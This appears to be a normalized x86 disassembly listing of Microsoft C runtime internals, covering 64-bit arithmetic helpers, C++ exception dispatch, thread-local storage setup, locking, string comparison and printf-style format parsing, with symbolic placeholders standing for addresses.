mov eax esi
sub_430166
push esi
call sub_4301e2
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_4301d9
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_4301d9
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_4301d9
mov [ eax ] 0xd
pop esi
retn
call sub_4301d9
mov [ eax ] 0x8
pop esi
retn
sub_430200
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4302b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4302f0
cmp cl 0x40
jae r-xdata
sar edx 0x1f
mov eax edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
sar edx 0x1f
and cl 0x1f
sar eax cl
retn
shrd eax edx cl
sar edx cl
retn
sub_430311
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_430cab
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4303ac
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_430666
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_4303ac
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_430cab
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_430c4a
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43055f
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_430be3
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_42d3b4
add esp 0x14
mov ebx eax
call sub_430be3
mov esi [ eax + 0x6c ]
call sub_430be3
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_435280
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_430cab
push 0x1
push esi
call sub_430a9e
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_430609
add esp 0xc
test eax eax
jne r-xdata
call sub_430cab
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43071a
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_43055f
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_430be3
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_42d3b4
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42d289
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43071a
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_430609
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_430da0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_430666
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_430cab
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_430b30
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_43071a
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_4308da
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_42d149
call sub_42d18b
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_430666
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_430795
add esp 0x2c
test eax eax
je r-xdata
sub_430795
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_430be3
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_430be3
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_430be3
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_430be3
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_42d210
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_430862
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_430862
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_430be3
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_430be3
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_42d4da
push eax
push edi
call sub_430a9e
pop ecx
pop ecx
sub_4308b0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_4308da
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_435280
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_435280
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_430cab
push 0x1
push edi
call sub_43529c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_435280
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_435280
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_43529c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_43529c
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_43529c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_42ea90
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_4352b8
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_430b05
pop ecx
pop ecx
push eax
push edi
call sub_42ea90
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_430b05
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42d17d
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_430b05
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_42d184
jmp r-xdata
push eax
call sub_430b05
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_430a9e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_42d17d
or [ ebp - 0x4 ] 0xffffffff
sub_430b05
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_430b30
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_42d4fd
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_42d4fd
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_430b7c
push esi
call sub_430d01
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_42fc2b
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_430bd0
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_430be3
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_42fc2b
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_42dba0
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_430bd0
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_430c4a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_430be3
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_430be3
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_432ea1
push 0x16
call sub_4361ab
pop ecx
pop ecx
push 0x3
call sub_42d880
sub_430cab
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_430c4a
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_430d2a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_42dd9c
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_430d2a
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_42dba0
pop ecx
call sub_42ded6
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_430d8b
pop ecx
pop edi
sub_430da0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_430e30
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_430ea0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_430f15
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_4349a8
add esp 0x1c
test eax eax
jne r-xdata
sub_430f8a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_432201
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_435403
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_432201
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_4353bf
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_4352e7
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_4310a2
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne r-xdata
jmp [ eax * 4 + jump_table_431820 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318de
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4318de
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
cmp [ esi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
